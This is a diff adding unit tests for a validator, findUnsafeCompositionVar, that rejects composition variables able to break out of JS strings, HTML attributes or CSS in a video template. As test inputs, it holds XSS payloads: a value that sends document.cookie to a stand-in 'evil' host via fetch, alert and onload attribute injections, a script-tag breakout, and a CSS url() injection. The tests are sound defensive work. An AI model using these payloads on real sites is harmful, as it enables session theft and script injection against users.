@@ -138,6 +138,108 @@ describe("isSafeCssColor", () => {
   });
 });
 
+describe("findUnsafeCompositionVar — numeric keys (JS-string / attribute XSS)", () => {
+  // Regression for the audit finding: these keys land in
+  // parseInt("{{capture.height}}") / parseFloat("{{duration}}") JS string
+  // literals and data-duration="{{duration}}" attributes, where escapeMarkup
+  // does NOT escape the closing quote — so a `"` breaks out and injects script.
+  it("rejects the exact parseInt() JS-string breakout payload", () => {
+    expect(
+      findUnsafeCompositionVar({
+        "capture.height": `1")||fetch('https://evil/?c='+document.cookie)||("`,
+      })?.key,
+    ).toBe("capture.height");
+  });
+
+  it("rejects a duration that breaks out of the JS string / data-duration attr", () => {
+    expect(
+      findUnsafeCompositionVar({ duration: `9");alert(document.domain)//` })?.key,
+    ).toBe("duration");
+    expect(
+      findUnsafeCompositionVar({ duration: `9" onload="alert(1)` })?.key,
+    ).toBe("duration");
+  });
+
+  it("rejects crop fractions and layout dimensions that carry a quote", () => {
+    expect(
+      findUnsafeCompositionVar({ "capture.cropX": `0");alert(1)//` })?.key,
+    ).toBe("capture.cropX");
+    expect(
+      findUnsafeCompositionVar({ "layout.width": `1080"><script>` })?.key,
+    ).toBe("layout.width");
+  });
+
+  it("rejects a sorrel.transitionsActive that breaks out of its quoted compare", () => {
+    expect(
+      findUnsafeCompositionVar({
+        "sorrel.transitionsActive": `1";alert(1);("`,
+      })?.key,
+    ).toBe("sorrel.transitionsActive");
+  });
+
+  it("accepts the plain numbers the real producers emit", () => {
+    // The exact shapes websiteToVideoService / buildCropVars / talkingHost emit.
+    expect(
+      findUnsafeCompositionVar({
+        duration: "9",
+        "capture.height": "9000",
+        "capture.cropX": "0",
+        "capture.cropY": "0.25",
+        "capture.cropW": "1",
+        "capture.cropH": "0.5",
+        "layout.width": "1080",
+        "layout.height": "1920",
+        "sorrel.transitionsActive": "1",
+      }),
+    ).toBeNull();
+    // Empty is "unset" — allowed like the color/url keys.
+    expect(findUnsafeCompositionVar({ duration: "" })).toBeNull();
+  });
+});
+
+describe("findUnsafeCompositionVar — token & font keys", () => {
+  it("rejects a layout.aspect that breaks out of the JS string / attribute", () => {
+    expect(
+      findUnsafeCompositionVar({ "layout.aspect": `portrait";alert(1)//` })?.key,
+    ).toBe("layout.aspect");
+    expect(
+      findUnsafeCompositionVar({ "layout.aspect": `x" onload="y` })?.key,
+    ).toBe("layout.aspect");
+  });
+
+  it("accepts the real aspect enum values", () => {
+    expect(
+      findUnsafeCompositionVar({ "layout.aspect": "portrait" }),
+    ).toBeNull();
+    expect(
+      findUnsafeCompositionVar({ "layout.aspect": "landscape" }),
+    ).toBeNull();
+    expect(findUnsafeCompositionVar({ "layout.aspect": "square" })).toBeNull();
+  });
+
+  it("rejects a brand.fontFamily override that injects CSS (the brand-write gate is bypassed via compositionVars)", () => {
+    expect(
+      findUnsafeCompositionVar({
+        "brand.fontFamily": `Inter; } body { background: url(https://evil/?c=x) } .z {`,
+      })?.key,
+    ).toBe("brand.fontFamily");
+    expect(
+      findUnsafeCompositionVar({
+        "brand.fontFamily": `Inter'; background:url(x)`,
+      })?.key,
+    ).toBe("brand.fontFamily");
+  });
+
+  it("accepts plain font names (including a space)", () => {
+    expect(
+      findUnsafeCompositionVar({ "brand.fontFamily": "Inter" }),
+    ).toBeNull();
+    expect(
+      findUnsafeCompositionVar({ "brand.fontFamily": "Space Grotesk" }),
+    ).toBeNull();
+  });
+});
+
 describe("findUnsafeCompositionVar — pass-through", () => {
   it("leaves non-constrained keys (text-content placeholders) alone", () => {
     // These land in HTML text content and are markup-escaped by the template;
